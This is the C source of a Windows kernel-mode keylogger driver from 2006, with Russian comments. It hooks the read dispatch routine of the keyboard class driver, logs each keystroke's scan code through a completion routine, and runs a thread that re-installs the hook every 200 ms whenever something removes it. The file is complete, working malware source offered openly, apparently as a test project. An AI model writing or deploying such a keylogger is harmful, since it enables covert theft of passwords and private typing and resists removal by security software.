/********************************************************************
	created:	2006/03/17
	created:	17:3:2006   13:52
	filename: 	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kddispatch\kddispatch.c
	file path:	C:\SourceSafe\Windows\Hook\TestProjects\Keylogger\kddispatch
	file base:	kddispatch
	file ext:	c
	author:		Андрей Груздев
	
	purpose:	кейлоггер - хук на dispatch table драйвера класса клавиатуры
*********************************************************************/

#include <ntifs.h>
#include <ntddkbd.h>

#include "..\kdprint\kernel\kdprint.h"
#include "..\kdprint\kdctl.h"

typedef
struct _GLOBAL_CONTEXT
{
	PDEVICE_OBJECT		m_pTargetDevice;
	PDRIVER_DISPATCH*	m_prReadHandler;
	PDRIVER_DISPATCH	m_rReadHandler;
} GLOBAL_CONTEXT, *PGLOBAL_CONTEXT;


GLOBAL_CONTEXT gKDContext;
volatile LONG gSysEnters = 0;
volatile BOOLEAN g_bUnload = FALSE;
HANDLE hPatchCheckThread = NULL;

NTSTATUS NTAPI KDReadCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PKEYBOARD_INPUT_DATA KeyData;
	ULONG KeyCount;
	ULONG i;

	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		KeyData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		KeyCount = Irp->IoStatus.Information/sizeof(KEYBOARD_INPUT_DATA);

		for(i = 0; i < KeyCount; i++)
		{
			KDPrint("kddispatch.sys: key SCANCODE:%d ", KeyData[i].MakeCode);

			if (KeyData[i].Flags == KEY_MAKE)
				KDPrint("pressed");
			
			if (KeyData[i].Flags & KEY_BREAK)
				KDPrint("released");
			if (KeyData[i].Flags & KEY_E0)
				KDPrint(" E0 flag");
			if (KeyData[i].Flags & KEY_E1)
				KDPrint(" E1 flag");

			KDPrint("\n");
		}
	}

	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);

	InterlockedDecrement((PLONG)&gSysEnters);

	return STATUS_SUCCESS;
}

NTSTATUS NTAPI KDReadDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	NTSTATUS ntStatus;
	PIO_STACK_LOCATION IrpSp;

// чтоб не выгрузиться слишком рано..
	InterlockedIncrement((PLONG)&gSysEnters);

	if (DeviceObject == gKDContext.m_pTargetDevice && !g_bUnload)
	{
// ручками устанавливаем completionroutine на текущий уровень
		IrpSp = IoGetCurrentIrpStackLocation(Irp);
		if (!IrpSp->CompletionRoutine)
		{
			IrpSp->CompletionRoutine = KDReadCompletion;
			IrpSp->Context = NULL;
			IrpSp->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;

// чтоб не выгрузиться слишком рано..
			InterlockedIncrement((PLONG)&gSysEnters);
		}
		else
			KDPrint("kddispatch.sys: completion routine not set..\n");
	}
// оригинальный обработчик
	ntStatus = gKDContext.m_rReadHandler(DeviceObject, Irp);

	InterlockedDecrement((PLONG)&gSysEnters);

	return ntStatus;
}

VOID CheckPatchRestore(IN OUT PVOID *p_frHandler, IN PVOID fHookHandler)
{
	if (*p_frHandler != fHookHandler)
	{
// восстанавливаем патч..
		*p_frHandler = fHookHandler;

		KDPrint("kddispatch.sys: somebody removed hook, restoring..\n");
		KDPrint("kddispatch.sys: restored hook handler\n");
	}
	else
		KDPrint("kddispatch.sys: hook still set\n");
}

VOID NTAPI PatchCheckThread(IN PVOID Context)
{
	LARGE_INTEGER ExpireTime;

	ExpireTime.QuadPart = -2000000L;	// 200 msec

	while (!g_bUnload)
	{
		CheckPatchRestore((PVOID *)gKDContext.m_prReadHandler, KDReadDispatch);
		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
	}

	PsTerminateSystemThread(STATUS_SUCCESS);
}

// получаем и референсим базовый девайс..
NTSTATUS ReferenceDeviceByName(IN PUNICODE_STRING DevicePath, OUT PDEVICE_OBJECT *p_pDeviceObject)
{
	OBJECT_ATTRIBUTES OA;
	NTSTATUS ntStatus;
	HANDLE hFile;
	IO_STATUS_BLOCK ioStatus;
	PFILE_OBJECT pFileObject;
	PDEVICE_OBJECT pDeviceObject;

	InitializeObjectAttributes(&OA, DevicePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	ntStatus = ZwOpenFile(&hFile, 0,  &OA, &ioStatus, 0, FILE_NON_DIRECTORY_FILE);
	if (NT_SUCCESS(ntStatus ))
	{
		ntStatus = ObReferenceObjectByHandle(hFile, 0, *IoFileObjectType, KernelMode, &pFileObject, NULL);
		if (NT_SUCCESS(ntStatus))
		{
			pDeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
			if (pDeviceObject)
			{
				ntStatus = ObReferenceObjectByPointer(pDeviceObject, 0, NULL, KernelMode);
				if (NT_SUCCESS(ntStatus))
					*p_pDeviceObject = pDeviceObject;
			}
		}

		ZwClose(hFile);
	}

	return ntStatus;
}

static PDEVICE_OBJECT g_pControlDeviceObject = NULL;

VOID NTAPI KDUnload(IN PDRIVER_OBJECT DriverObject)
{
	LARGE_INTEGER ExpireTime;
	UNICODE_STRING cntdSymlinkName;

	g_bUnload = TRUE;
	ZwWaitForSingleObject(hPatchCheckThread, FALSE, NULL);
	ZwClose(hPatchCheckThread);

// ждем выхода из completionroutine
	ExpireTime.QuadPart = -1000000L;	// 100 msec
	while (gSysEnters)
		KeDelayExecutionThread(KernelMode, FALSE, &ExpireTime);
// восстанаваливаем dispatchtable
	gKDContext.m_pTargetDevice->DriverObject->MajorFunction[IRP_MJ_READ] = gKDContext.m_rReadHandler;

	ObDereferenceObject(gKDContext.m_pTargetDevice);

	KDPrintUnInit();
	
	RtlInitUnicodeString(&cntdSymlinkName, K_CONTROL_SYMLINK_NAME(KDDISPATCH));
	IoDeleteSymbolicLink(&cntdSymlinkName);
	IoDeleteDevice(g_pControlDeviceObject);

	KDPrint("kddispatch.sys: unloaded..\n");
}

NTSTATUS NTAPI KDControlDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	NTSTATUS ntStatus = STATUS_INVALID_DEVICE_REQUEST;
	PIO_STACK_LOCATION IrpSp = IoGetCurrentIrpStackLocation(Irp);


	if (IrpSp->DeviceObject == g_pControlDeviceObject)
	{
		switch (IrpSp->MajorFunction)
		{
		case IRP_MJ_CREATE:
		case IRP_MJ_CLOSE:
			ntStatus = STATUS_SUCCESS;
			break;
		case IRP_MJ_DEVICE_CONTROL:
			if (IrpSp->Parameters.DeviceIoControl.IoControlCode != IOCTL_INIT_KDPRINT)
				break;

			if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(KDPRINT_INIT_INPARAM))
			{
				ntStatus = KDPrintInit(	((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSectionMutant,
										((PKDPRINT_INIT_INPARAM)Irp->AssociatedIrp.SystemBuffer)->m_hSection);
			}
		}
	}

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}

NTSTATUS NTAPI DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS ntStatus;
	UNICODE_STRING cntdKbdClassStr;
	PDEVICE_OBJECT pDeviceObject;
	UNICODE_STRING cntdControlDeviceName;
	UNICODE_STRING cntdControlSymlinkName;

	DriverObject->DriverUnload = KDUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KDControlDispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KDControlDispatch;
	
	RtlInitUnicodeString(&cntdControlDeviceName, K_CONTROL_DEVICE_NAME(KDDISPATCH));
	ntStatus = IoCreateDevice(DriverObject, 0, &cntdControlDeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE,
		&g_pControlDeviceObject);
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;

	g_pControlDeviceObject->Flags |= DO_BUFFERED_IO;

	RtlInitUnicodeString(&cntdControlSymlinkName, K_CONTROL_SYMLINK_NAME(KDDISPATCH));
	ntStatus = IoCreateSymbolicLink(&cntdControlSymlinkName, &cntdControlDeviceName);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(g_pControlDeviceObject);
		return ntStatus;
	}

	RtlInitUnicodeString(&cntdKbdClassStr, L"\\Device\\KeyboardClass0");
	ntStatus = ReferenceDeviceByName(&cntdKbdClassStr, &pDeviceObject);
	if (!NT_SUCCESS(ntStatus))
	{
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(g_pControlDeviceObject);
		return STATUS_UNSUCCESSFUL;
	}

// патчим dispatchtable
	gKDContext.m_pTargetDevice = pDeviceObject;
	gKDContext.m_prReadHandler = pDeviceObject->DriverObject->MajorFunction+IRP_MJ_READ;
	gKDContext.m_rReadHandler = pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ];
	pDeviceObject->DriverObject->MajorFunction[IRP_MJ_READ] = KDReadDispatch;

	ntStatus = PsCreateSystemThread(&hPatchCheckThread, 0, NULL, NULL, NULL, PatchCheckThread, NULL);
	if (!NT_SUCCESS(ntStatus))	
	{
		IoDeleteSymbolicLink(&cntdControlSymlinkName);
		IoDeleteDevice(g_pControlDeviceObject);

		gKDContext.m_pTargetDevice->DriverObject->MajorFunction[IRP_MJ_READ] = gKDContext.m_rReadHandler;
		ObDereferenceObject(gKDContext.m_pTargetDevice);
		
		return STATUS_UNSUCCESSFUL;
	}

	g_pControlDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	KDPrint("kddispatch.sys: loaded..\n");

	return STATUS_SUCCESS;
}
